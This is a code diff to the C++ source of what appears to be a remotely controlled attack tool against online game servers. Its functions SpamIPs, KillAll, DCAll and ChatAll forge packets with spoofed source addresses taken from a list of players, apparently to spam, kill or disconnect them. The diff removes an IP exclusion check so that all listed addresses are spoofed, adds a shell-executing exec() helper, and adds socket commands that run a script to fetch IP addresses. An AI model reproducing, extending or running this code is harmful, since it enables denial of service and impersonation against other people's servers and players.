@@ -234,6 +234,19 @@ bool Create(SOCKET *pSock)
 	return true;
 }
 
+std::string exec(char* cmd) {
+	FILE* pipe = _popen(cmd, "r");
+	if (!pipe) return "ERROR";
+	char buffer[128];
+	std::string result = "";
+	while (!feof(pipe)) {
+		if (fgets(buffer, 128, pipe) != NULL)
+			result += buffer;
+	}
+	_pclose(pipe);
+	return result;
+}
+
 void Output(char *pBuf)
 {
 	//FILE *pFile = fopen("Sniffer.txt","a+"); 
@@ -697,12 +710,12 @@ void SpamIPs(const char *IP, int Port)
 			Char++;
 		}
 
-		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
 		{
 			m_FromIP = inet_addr(aSplit[0]);
 			m_FromPort = htons(atoi(aSplit[1]));
 
-			printf(aSplit[0]);
+		//	printf(aSplit[0]);
 
 			m_ToIP = inet_addr(IP);
 			m_ToPort = htons(Port);
@@ -757,7 +770,7 @@ void KillAll(const char *IP, int Port)
 			Char++;
 		}
 
-		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
 		{
 			m_FromIP = inet_addr(aSplit[0]);
 			m_FromPort = htons(atoi(aSplit[1]));
@@ -812,7 +825,7 @@ void DCAll(const char *IP, int Port)
 			Char++;
 		}
 
-		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
 		{
 			m_FromIP = inet_addr(aSplit[0]);
 			m_FromPort = htons(atoi(aSplit[1]));
@@ -867,7 +880,7 @@ void ChatAll(const char *IP, int Port, const char *Msg)
 			Char++;
 		}
 
-		if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
+		//if (!strcmp(aSplit[0], "178.36.222.94")) //add urs ip to exclude list 
 		{
 			m_FromIP = inet_addr(aSplit[0]);
 			m_FromPort = htons(atoi(aSplit[1]));
@@ -1308,12 +1321,13 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					{
 						char aMsg[256];
 						ZeroMemory(&aMsg, sizeof(aMsg));
-						for(int i = 1; i <= Cmd; i++)
+						for (int i = 1; i <= Cmd; i++)
 						{
 							char aBuf[128];
 							str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
 							str_append(aMsg, aBuf, sizeof(aMsg));
 						}
+
 						ChatDummies(aMsg);
 						send(g_Client, "[Server]: Chatmessage was sent from all dummies!", strlen("[Server]: Chatmessage was sent from all dummies!"), 0);
 					}
@@ -1324,6 +1338,17 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: chatdummies <msg>", strlen("[Server]: Please use: chatdummies <msg>"), 0);
+			}
+			else if (strcmp(aCmd[0], "fetchips") == 0)
+			{
+				exec("fetchips.py");
+				send(g_Client, "[Server]: Fetching ips ... done", strlen("[Server]: Fetching ips ... done"), 0);
+			}
+			else if (strcmp(aCmd[0], "exit") == 0)
+			{
+				send(g_Client, "[Server]: Closing thread...", strlen("[Server]: Closing thread..."), 0);
+				printf("Closed thread");
+				return 0;
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
